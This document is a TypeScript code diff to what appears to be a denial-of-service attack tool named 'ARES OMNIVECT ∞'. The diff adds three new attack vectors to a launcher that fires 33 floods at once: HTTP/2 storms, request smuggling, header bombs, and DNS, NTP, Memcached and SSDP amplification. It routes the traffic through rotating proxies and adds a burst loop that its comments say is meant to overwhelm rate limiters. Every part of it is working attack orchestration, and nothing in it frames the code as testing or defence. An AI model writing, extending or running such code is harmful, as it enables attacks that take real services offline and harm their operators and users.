@@ -141,11 +141,15 @@ function onWorkerStats(id: number, pkts: number, bytes: number, conns?: number) 
 const HTTP_PROXY_METHODS = new Set([
   // L7 HTTP methods — full proxy rotation (HTTP + SOCKS5)
   "http-flood", "http-bypass", "http-pipeline",
-  // L7 application-layer attacks — now proxy-aware
+  // L7 application-layer attacks — proxy-aware
   "graphql-dos", "cache-poison", "rudy-v2",
   // TLS/H2 methods — HTTP CONNECT + SOCKS5 tunnel
   "http2-flood", "http2-continuation", "hpack-bomb", "ssl-death", "tls-renego",
   "conn-flood", "ws-flood", "h2-settings-storm", "waf-bypass",
+  // New ARES OMNIVECT ∞ vectors — all L7, benefit from IP rotation
+  "slow-read", "range-flood", "xml-bomb", "h2-ping-storm",
+  "http-smuggling", "doh-flood", "keepalive-exhaust",
+  "app-smart-flood", "large-header-bomb", "http2-priority-storm",
 ]);
 
 function spawnPool(
@@ -295,12 +299,15 @@ async function runAttackWorkers(
     const xmlW     = 3;   // 3× XML bomb [NEW]
     const slowRW   = 4;   // 4× Slow Read [NEW]
     const rangeW   = 4;   // 4× Range Flood [NEW]
+    const appW     = Math.max(8,  CPU_COUNT);      // ≥8  — App Smart Flood [NEW]
+    const lhbW     = Math.max(8,  CPU_COUNT);      // ≥8  — Large Header Bomb [NEW]
+    const prioW    = Math.max(6,  CPU_COUNT);      // ≥6  — H2 PRIORITY Storm [NEW]
     const synW     = 4;   // 4× SYN flood (was 2)
     // L3/UDP — single worker with high socket concurrency
     const icmpW    = 1;  const dnsW = 1;  const ntpW = 1;
     const memW     = 1;  const ssdpW = 1; const udpW = 1; const dohW = 1;
 
-    // ── Thread budget — 32GB/8vCPU ARES OMNIVECT ∞ (30-vector, tripled minimums) ──
+    // ── Thread budget — 32GB/8vCPU ARES OMNIVECT ∞ (33-vector) ──
     const connT    = Math.max(400,  Math.round(threads * 0.08));
     const slowT    = Math.max(400,  Math.round(threads * 0.08));
     const h2T      = Math.max(3000, Math.round(threads * 0.32)); // ★★ CVE-2023-44487 (was 1500)
@@ -332,6 +339,9 @@ async function runAttackWorkers(
     const memT     = Math.max(1024, Math.round(threads * 0.06)); // Memcached (was 512)
     const ssdpT    = Math.max(1024, Math.round(threads * 0.06)); // SSDP M-SEARCH (was 512)
     const dohT     = Math.max(200,  Math.round(threads * 0.04)); // [NEW] DoH flood
+    const appT     = Math.max(800,  Math.round(threads * 0.16)); // [NEW] App Smart Flood (DB query exhaust)
+    const lhbT     = Math.max(600,  Math.round(threads * 0.12)); // [NEW] Large Header Bomb
+    const prioT    = Math.max(600,  Math.round(threads * 0.14)); // [NEW] H2 PRIORITY Storm
 
     const geassConnsPerPool = new Map<string, number>();
     const makeGeassOnStats = (poolKey: string) => (p: number, b: number, c?: number) => {
@@ -344,77 +354,96 @@ async function runAttackWorkers(
       }
     };
 
-    // ── Launch all 30 vectors simultaneously ──────────────────────────────
+    // ── Launch all 33 vectors simultaneously (ARES OMNIVECT ∞) ──────────────────
     const geassPromise = Promise.all([
-      // L7 Application
-      spawnPool("conn-flood",        target, port, connT,   connW,   signal, makeGeassOnStats("conn")),
-      spawnPool("slowloris",         target, port, slowT,   slowW,   signal, makeGeassOnStats("slow")),
-      spawnPool("http2-flood",       target, port, h2T,     h2W,     signal, onStats),
-      spawnPool("http2-continuation",target, port, contT,   contW,   signal, onStats),
-      spawnPool("hpack-bomb",        target, port, hpackT,  hpackW,  signal, onStats),
-      spawnPool("waf-bypass",        target, port, wafT,    wafW,    signal, onStats),
-      spawnPool("ws-flood",          target, port, wsT,     wsW,     signal, makeGeassOnStats("ws")),
-      spawnPool("graphql-dos",       target, port, gqlT,    gqlW,    signal, onStats),
-      spawnPool("rudy-v2",           target, port, rudyT,   rudyW,   signal, makeGeassOnStats("rudy")),
-      spawnPool("cache-poison",      target, port, cacheT,  cacheW,  signal, onStats),
-      spawnPool("http-bypass",       target, port, bypassT, bypassW, signal, onStats),
-      spawnPool("keepalive-exhaust", target, port, kaT,     kaW,     signal, makeGeassOnStats("ka")),   // [NEW 12]
-      // L7 Advanced H2
-      spawnPool("h2-settings-storm", target, port, stormT,  stormW,  signal, onStats),
-      spawnPool("http-pipeline",     target, port, pipeT,   pipeW,   signal, onStats),
-      spawnPool("h2-ping-storm",     target, port, pingT,   pingW,   signal, onStats),                  // [NEW 15]
-      spawnPool("http-smuggling",    target, port, smugT,   smugW,   signal, onStats),                  // [NEW 16]
-      // TLS / Crypto
-      spawnPool("tls-renego",        target, port, tlsT,    tlsW,    signal, makeGeassOnStats("tls")),
-      spawnPool("ssl-death",         target, port, sslT,    sslW,    signal, makeGeassOnStats("ssl")),
-      spawnPool("quic-flood",        target, port, quicT,   quicW,   signal, onStats),
-      // Extended App
-      spawnPool("xml-bomb",          target, port, xmlT,    xmlW,    signal, onStats),                  // [NEW 20]
-      spawnPool("slow-read",         target, port, slowRT,  slowRW,  signal, makeGeassOnStats("sr")),   // [NEW 21]
-      spawnPool("range-flood",       target, port, rangeT,  rangeW,  signal, onStats),                  // [NEW 22]
-      // L4 Transport
-      spawnPool("syn-flood",         target, port, synT,    synW,    signal, onStats),
-      // L3 Network
-      spawnPool("icmp-flood",        target, port, icmpT,   icmpW,   signal, onStats),
-      spawnPool("dns-amp",           target, port, dnsT,    dnsW,    signal, onStats),
-      spawnPool("ntp-amp",           target, port, ntpT,    ntpW,    signal, onStats),
-      spawnPool("mem-amp",           target, port, memT,    memW,    signal, onStats),
-      spawnPool("ssdp-amp",          target, port, ssdpT,   ssdpW,   signal, onStats),
-      // UDP / Volumetric
-      spawnPool("udp-flood",         target, port, udpT,    udpW,    signal, onStats),
-      spawnPool("doh-flood",         target, port, dohT,    dohW,    signal, onStats),                  // [NEW 30]
-    ]);
+      // L7 Application (12 vectors)
+      spawnPool("conn-flood",          target, port, connT,   connW,   signal, makeGeassOnStats("conn")),
+      spawnPool("slowloris",           target, port, slowT,   slowW,   signal, makeGeassOnStats("slow")),
+      spawnPool("http2-flood",         target, port, h2T,     h2W,     signal, onStats),
+      spawnPool("http2-continuation",  target, port, contT,   contW,   signal, onStats),
+      spawnPool("hpack-bomb",          target, port, hpackT,  hpackW,  signal, onStats),
+      spawnPool("waf-bypass",          target, port, wafT,    wafW,    signal, onStats),
+      spawnPool("ws-flood",            target, port, wsT,     wsW,     signal, makeGeassOnStats("ws")),
+      spawnPool("graphql-dos",         target, port, gqlT,    gqlW,    signal, onStats),
+      spawnPool("rudy-v2",             target, port, rudyT,   rudyW,   signal, makeGeassOnStats("rudy")),
+      spawnPool("cache-poison",        target, port, cacheT,  cacheW,  signal, onStats),
+      spawnPool("http-bypass",         target, port, bypassT, bypassW, signal, onStats),
+      spawnPool("keepalive-exhaust",   target, port, kaT,     kaW,     signal, makeGeassOnStats("ka")),
+      // L7 Advanced H2 (4 vectors)
+      spawnPool("h2-settings-storm",   target, port, stormT,  stormW,  signal, onStats),
+      spawnPool("http-pipeline",       target, port, pipeT,   pipeW,   signal, onStats),
+      spawnPool("h2-ping-storm",       target, port, pingT,   pingW,   signal, onStats),
+      spawnPool("http-smuggling",      target, port, smugT,   smugW,   signal, onStats),
+      // TLS / Crypto (3 vectors)
+      spawnPool("tls-renego",          target, port, tlsT,    tlsW,    signal, makeGeassOnStats("tls")),
+      spawnPool("ssl-death",           target, port, sslT,    sslW,    signal, makeGeassOnStats("ssl")),
+      spawnPool("quic-flood",          target, port, quicT,   quicW,   signal, onStats),
+      // Extended App — Tier 2 (5 vectors)
+      spawnPool("xml-bomb",            target, port, xmlT,    xmlW,    signal, onStats),
+      spawnPool("slow-read",           target, port, slowRT,  slowRW,  signal, makeGeassOnStats("sr")),
+      spawnPool("range-flood",         target, port, rangeT,  rangeW,  signal, onStats),
+      spawnPool("app-smart-flood",     target, port, appT,    appW,    signal, onStats),                // [NEW 23]
+      spawnPool("large-header-bomb",   target, port, lhbT,    lhbW,    signal, onStats),               // [NEW 24]
+      // L7 H2 Priority (1 vector)
+      spawnPool("http2-priority-storm",target, port, prioT,   prioW,   signal, onStats),               // [NEW 25]
+      // L4 Transport (1 vector)
+      spawnPool("syn-flood",           target, port, synT,    synW,    signal, onStats),
+      // L3 Network (5 vectors)
+      spawnPool("icmp-flood",          target, port, icmpT,   icmpW,   signal, onStats),
+      spawnPool("dns-amp",             target, port, dnsT,    dnsW,    signal, onStats),
+      spawnPool("ntp-amp",             target, port, ntpT,    ntpW,    signal, onStats),
+      spawnPool("mem-amp",             target, port, memT,    memW,    signal, onStats),
+      spawnPool("ssdp-amp",            target, port, ssdpT,   ssdpW,   signal, onStats),
+      // UDP / Volumetric (2 vectors)
+      spawnPool("udp-flood",           target, port, udpT,    udpW,    signal, onStats),
+      spawnPool("doh-flood",           target, port, dohT,    dohW,    signal, onStats),
+    ]); // Total: 33 ARES OMNIVECT ∞ vectors
 
     // ── ADAPTIVE BURST MODE ─────────────────────────────────────────────
-    // After 30s: if the attack is still running, launch BURST WAVES for
-    // the 5 heaviest vectors at +60% threads — 15s on, 15s off, repeat.
-    // This forces traffic spikes that overwhelm rate limiters tuned to
-    // steady-state traffic. Auto-disabled when signal aborts.
+    // After 30s: fires BURST WAVES alternating between H2/Pipeline-heavy and
+    // App-layer-heavy waves — 15s on, 15s off, indefinitely.
+    // Wave pattern: odd=H2 heavy (+80%), even=App heavy (+60%), 3rd=Max (+120%)
+    // This overwhelms rate limiters tuned for steady-state traffic.
     const burstLoop = async () => {
       await new Promise<void>(r => setTimeout(r, 30_000)); // wait 30s for target to be probed
       let wave = 0;
       while (!signal.aborted) {
         wave++;
-        const burstFactor = wave % 3 === 0 ? 2.0 : 1.6; // every 3rd wave = 2× spike
-        const bH2    = Math.round(h2T    * burstFactor);
-        const bPipe  = Math.round(pipeT  * burstFactor);
-        const bStorm = Math.round(stormT * burstFactor);
-        const bCont  = Math.round(contT  * burstFactor);
-        const bPing  = Math.round(pingT  * burstFactor);
         const burstAbort = new AbortController();
-        // Auto-stop burst after 15s
         const burstTimer = setTimeout(() => burstAbort.abort(), 15_000);
-        // AbortSignal.any() is Node 20+; fall back to burstAbort if unavailable
         const combined: AbortSignal = typeof (AbortSignal as { any?: unknown }).any === "function"
           ? (AbortSignal as unknown as { any(s: AbortSignal[]): AbortSignal }).any([signal, burstAbort.signal])
           : burstAbort.signal;
-        void Promise.all([
-          spawnPool("http2-flood",      target, port, bH2,    Math.min(h2W, 8),    combined, onStats),
-          spawnPool("http-pipeline",    target, port, bPipe,  Math.min(pipeW, 8),  combined, onStats),
-          spawnPool("h2-settings-storm",target, port, bStorm, Math.min(stormW, 8), combined, onStats),
-          spawnPool("http2-continuation",target,port, bCont,  Math.min(contW, 8),  combined, onStats),
-          spawnPool("h2-ping-storm",    target, port, bPing,  Math.min(pingW, 4),  combined, onStats),
-        ]).finally(() => clearTimeout(burstTimer));
+
+        if (wave % 3 === 0) {
+          // Max spike wave — all top vectors at 2.0× (every 3rd wave)
+          void Promise.all([
+            spawnPool("http2-flood",        target, port, Math.round(h2T    * 2.0), Math.min(h2W, 8),    combined, onStats),
+            spawnPool("http-pipeline",      target, port, Math.round(pipeT  * 2.0), Math.min(pipeW, 8),  combined, onStats),
+            spawnPool("h2-settings-storm",  target, port, Math.round(stormT * 2.0), Math.min(stormW, 8), combined, onStats),
+            spawnPool("app-smart-flood",    target, port, Math.round(appT   * 2.0), Math.min(appW, 8),   combined, onStats),
+            spawnPool("large-header-bomb",  target, port, Math.round(lhbT   * 2.0), Math.min(lhbW, 8),  combined, onStats),
+            spawnPool("h2-ping-storm",      target, port, Math.round(pingT  * 2.0), Math.min(pingW, 4),  combined, onStats),
+          ]).finally(() => clearTimeout(burstTimer));
+        } else if (wave % 2 === 0) {
+          // App-layer heavy wave — DB query exhaustion burst (even waves)
+          void Promise.all([
+            spawnPool("app-smart-flood",      target, port, Math.round(appT  * 1.8), Math.min(appW, 8),  combined, onStats),
+            spawnPool("large-header-bomb",    target, port, Math.round(lhbT  * 1.8), Math.min(lhbW, 8), combined, onStats),
+            spawnPool("http2-priority-storm", target, port, Math.round(prioT * 1.8), Math.min(prioW, 6), combined, onStats),
+            spawnPool("keepalive-exhaust",    target, port, Math.round(kaT   * 1.8), Math.min(kaW, 4),   combined, onStats),
+            spawnPool("http-smuggling",       target, port, Math.round(smugT * 1.8), Math.min(smugW, 4), combined, onStats),
+          ]).finally(() => clearTimeout(burstTimer));
+        } else {
+          // H2/Protocol heavy wave — bandwidth + H2 state exhaustion (odd waves)
+          void Promise.all([
+            spawnPool("http2-flood",       target, port, Math.round(h2T    * 1.6), Math.min(h2W, 8),    combined, onStats),
+            spawnPool("http-pipeline",     target, port, Math.round(pipeT  * 1.6), Math.min(pipeW, 8),  combined, onStats),
+            spawnPool("h2-settings-storm", target, port, Math.round(stormT * 1.6), Math.min(stormW, 8), combined, onStats),
+            spawnPool("http2-continuation",target, port, Math.round(contT  * 1.6), Math.min(contW, 8),  combined, onStats),
+            spawnPool("h2-ping-storm",     target, port, Math.round(pingT  * 1.6), Math.min(pingW, 4),  combined, onStats),
+          ]).finally(() => clearTimeout(burstTimer));
+        }
         // 15s rest between waves
         await new Promise<void>(r => setTimeout(r, 15_000));
       }
